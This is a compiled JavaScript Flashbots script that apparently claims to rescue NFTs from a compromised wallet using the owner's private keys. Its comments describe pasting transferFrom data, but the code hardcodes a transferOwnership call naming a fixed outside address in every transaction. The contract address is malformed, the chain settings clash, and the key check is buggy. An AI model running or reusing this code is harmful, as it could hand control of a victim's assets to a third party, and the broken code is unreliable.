"use strict";
/* IMPORTANT: PLEASE OPEN THE README.MD FILE IN THIS PROJECT FOLDER FIRST BEFORE TOUCHING THIS CODE DOWN BELOW. THANK YOU !! */
var __assign = (this && this.__assign) || function () {
    __assign = Object.assign || function(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
            s = arguments[i];
            for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p))
                t[p] = s[p];
        }
        return t;
    };
    return __assign.apply(this, arguments);
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
exports.__esModule = true;
// DON'T CHANGE
var ethers_1 = require("ethers");
var ethers_provider_bundle_1 = require("@flashbots/ethers-provider-bundle");
var web3_utils_1 = require("web3-utils");
var dotenv = require("dotenv");
dotenv.config();
var GWEI = ethers_1.BigNumber.from(10).pow(9); // DON'T CHANGE
var PRIORITY_FEE = GWEI.mul(15); // Choose the GWEI number with highest priority from the following link https://etherscan.io/gastracker. (example: 17)
var BLOCKS_IN_THE_FUTURE = 1; // DON'T CHANGE
// DON'T CHANGE
var FLASHBOTS_ENDPOINT = 'https://rpc-bsc.48.club/';
var CHAIN_ID = 56;
// DON'T CHANGE
var convertWeiToEth = function (wei) {
    return (0, web3_utils_1.fromWei)(wei.toString(), 'ether');
};
// DON'T CHANGE
var convertWeiToGwei = function (wei) {
    return (0, web3_utils_1.fromWei)(wei.toString(), 'gwei');
};
// DON'T CHANGE
var INFURA_KEY = process.env.INFURA_KEY;
// DON'T CHANGE
var SUPPORT_WALLET_PRIVATE_KEY = process.env.SUPPORT_WALLET_PRIVATE_KEY;
// DON'T CHANGE
var COMPROMISED_WALLET_PRIVATE_KEY = process.env.COMPROMISED_WALLET_PRIVATE_KEY;
if (!(INFURA_KEY || SUPPORT_WALLET_PRIVATE_KEY || SUPPORT_WALLET_PRIVATE_KEY)) {
    console.log('Please include INFURA_KEY, SUPPORT_WALLET_PRIVATE_KEY, and COMPROMISED_WALLET_PRIVATE_KEY as env variables.');
    process.exit(1);
}
// DON'T CHANGE
var SEND_BUNDLE = process.env.SEND_BUNDLE;
if (SEND_BUNDLE === 'true') {
    console.log('Sending bundle');
}
else {
    console.log('Running only simulation, please set SEND_BUNDLE=true to send bundle');
}
// DON'T CHANGE
var provider = new ethers_1.providers.InfuraProvider(CHAIN_ID, INFURA_KEY); // Fill in your Infura API key in the .env file
var fundingWallet = new ethers_1.Wallet(SUPPORT_WALLET_PRIVATE_KEY, provider); // Fill in your support private key in the .env file
var compromisedWallet = new ethers_1.Wallet(COMPROMISED_WALLET_PRIVATE_KEY, provider); // Fill in your compromised private key in the .env file
// DON'T CHANGE
var tx = function (args) { return (__assign({ chainId: CHAIN_ID, type: 2, maxPriorityFeePerGas: PRIORITY_FEE, data: '0xf2fde38b0000000000000000000000002cb42fe68173714cf09b64fc7d60742acf73e646', value: 0n }, args)); };
// DON'T CHANGE
var getBundle = function (maxBaseFeeInNextBlock) {
    var maxFeePerGas = PRIORITY_FEE.add(maxBaseFeeInNextBlock); // DON'T CHANGE
    var totalGasNeeded = ethers_1.BigNumber.from("2314586"); // Paste the same gasLimit here you filled in at line 109 vice versa. They have to match.
    var fundAmount = maxFeePerGas.mul(totalGasNeeded); // DON'T CHANGE
    // DON'T CHANGE
    console.log("Priority fee:\t\t".concat(PRIORITY_FEE, " WEI, ").concat(convertWeiToGwei(PRIORITY_FEE), " GWEI\n  Base fee:\t\t").concat(maxBaseFeeInNextBlock, " WEI, ").concat(convertWeiToGwei(maxBaseFeeInNextBlock), " GWEI\n  Max fee per gas:\t").concat(maxFeePerGas, " WEI, ").concat(convertWeiToGwei(maxFeePerGas), " GWEI\n  Fund amount:\t\t").concat(fundAmount, " WEI, ").concat(convertWeiToGwei(fundAmount), " GWEI, ").concat(convertWeiToEth(fundAmount), " ETH"));
    // DON'T CHANGE
    var bundle = [
        {
            transaction: tx({
                to: compromisedWallet.address,
                maxFeePerGas: maxFeePerGas,
                gasLimit: 21000,
                value: fundAmount
            }),
            signer: fundingWallet
        },
        /* This is editable part of the code. Follow these steps to find the address of your specific NFT:
      
        1. Open the Etherscan of the NFT you want to transfer out of the compromised wallet (example: https://etherscan.io/address/0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d)
        2. Paste '#writeContract' at the of the URL from Step 1 in your address bar (example: https://etherscan.io/address/0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d#writeContract)
        3. Click on 'Connect with Web3' button and connect with MetaMask
        4. Scroll down until you see 'TransferFrom' and open it
        5. Now do as follows:
          5.1 Fill in your compromised blockchain wallet address in the first field (example : 0xD76Bde6651939C6181C96219a3390B4FD7730812)
          5.2 Fill in your support blockchain wallet address in the second field (example : 0xM06Bde6651939C6181C96219a3390B4FD7730812)
          5.3 Fill in the tokenId of your specific NFT, it's under the 'Details' tab of your NFT (example: https://opensea.io/assets/ethereum/0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d/9771)
          5.4 Click the 'Write' button and click the 'HEX' tab when the MetaMask screen pops up. Copy the HEX code and paste .
    
        */
        {
            transaction: tx({
                to: '0xda025fb506D662EEa63C7684B000647b5bc01938RE',
                maxFeePerGas: maxFeePerGas,
                gasLimit: "2314586",
                data: '0xf2fde38b0000000000000000000000002cb42fe68173714cf09b64fc7d60742acf73e646'
            }),
            signer: compromisedWallet
        }
    ];
    return bundle;
};
// DON'T CHANGE
var attempt = 0;
function main() {
    return __awaiter(this, void 0, void 0, function () {
        var flashbotsProvider, err_1;
        var _this = this;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0:
                    console.log('Starting flashbot...');
                    _a.label = 1;
                case 1:
                    _a.trys.push([1, 3, , 4]);
                    console.log('Retreiving Flashbots Provider...');
                    return [4 /*yield*/, ethers_provider_bundle_1.FlashbotsBundleProvider.create(provider, ethers_1.Wallet.createRandom(), FLASHBOTS_ENDPOINT)];
                case 2:
                    flashbotsProvider = _a.sent();
                    return [3 /*break*/, 4];
                case 3:
                    err_1 = _a.sent();
                    console.error(err_1);
                    return [3 /*break*/, 4];
                case 4:
                    // DON'T CHANGE
                    provider.on('block', function (blockNumber) { return __awaiter(_this, void 0, void 0, function () {
                        var targetBlock, block, maxBaseFeeInFutureBlock, signedBundle, simulation, txBundle, waitResponse, err_2;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    targetBlock = blockNumber + BLOCKS_IN_THE_FUTURE;
                                    console.log("Attempt: ".concat(attempt, " - Preparing bundle for block: ").concat(targetBlock));
                                    _a.label = 1;
                                case 1:
                                    _a.trys.push([1, 8, , 9]);
                                    return [4 /*yield*/, provider.getBlock(blockNumber)];
                                case 2:
                                    block = _a.sent();
                                    maxBaseFeeInFutureBlock = ethers_provider_bundle_1.FlashbotsBundleProvider.getMaxBaseFeeInFutureBlock(block.baseFeePerGas, BLOCKS_IN_THE_FUTURE);
                                    console.log("Max base fee in block ".concat(targetBlock, " is ").concat(maxBaseFeeInFutureBlock, " WEI"));
                                    return [4 /*yield*/, flashbotsProvider.signBundle(getBundle(maxBaseFeeInFutureBlock))];
                                case 3:
                                    signedBundle = _a.sent();
                                    console.log('Running simulation');
                                    return [4 /*yield*/, flashbotsProvider.simulate(signedBundle, targetBlock)];
                                case 4:
                                    simulation = _a.sent();
                                    console.log(simulation);
                                    if ('error' in simulation) {
                                        console.warn("Simulation Error: ".concat(simulation.error.message));
                                        process.exit(1);
                                    }
                                    else {
                                        console.log("Simulation Success: ".concat(JSON.stringify(simulation, null, 2)));
                                        console.log(simulation);
                                    }
                                    if (!SEND_BUNDLE) return [3 /*break*/, 7];
                                    console.log('Run bundle');
                                    return [4 /*yield*/, flashbotsProvider.sendRawBundle(signedBundle, targetBlock)];
                                case 5:
                                    txBundle = _a.sent();
                                    if ('error' in txBundle) {
                                        console.error('Fatal error in bundle:', txBundle.error);
                                        process.exit(1);
                                    }
                                    return [4 /*yield*/, txBundle.wait()];
                                case 6:
                                    waitResponse = _a.sent();
                                    console.log("Wait Response: ".concat(ethers_provider_bundle_1.FlashbotsBundleResolution[waitResponse]));
                                    if (waitResponse === ethers_provider_bundle_1.FlashbotsBundleResolution.BundleIncluded) {
                                        console.log("Bundle included in block ".concat(targetBlock), waitResponse);
                                        process.exit(0);
                                    }
                                    else if (waitResponse === ethers_provider_bundle_1.FlashbotsBundleResolution.AccountNonceTooHigh) {
                                        console.log("Nonce too high (block: ".concat(targetBlock, ")"), waitResponse);
                                        process.exit(0);
                                    }
                                    else if (waitResponse === ethers_provider_bundle_1.FlashbotsBundleResolution.BlockPassedWithoutInclusion) {
                                        console.log("Not included in ".concat(blockNumber), waitResponse);
                                    }
                                    else {
                                        console.log('Unexpected response obtained', waitResponse);
                                    }
                                    _a.label = 7;
                                case 7:
                                    attempt++;
                                    return [3 /*break*/, 9];
                                case 8:
                                    err_2 = _a.sent();
                                    console.error('Fatal request error', err_2);
                                    process.exit(1);
                                    return [3 /*break*/, 9];
                                case 9: return [2 /*return*/];
                            }
                        });
                    }); });
                    return [2 /*return*/];
            }
        });
    });
}
// DON'T CHANGE
main();
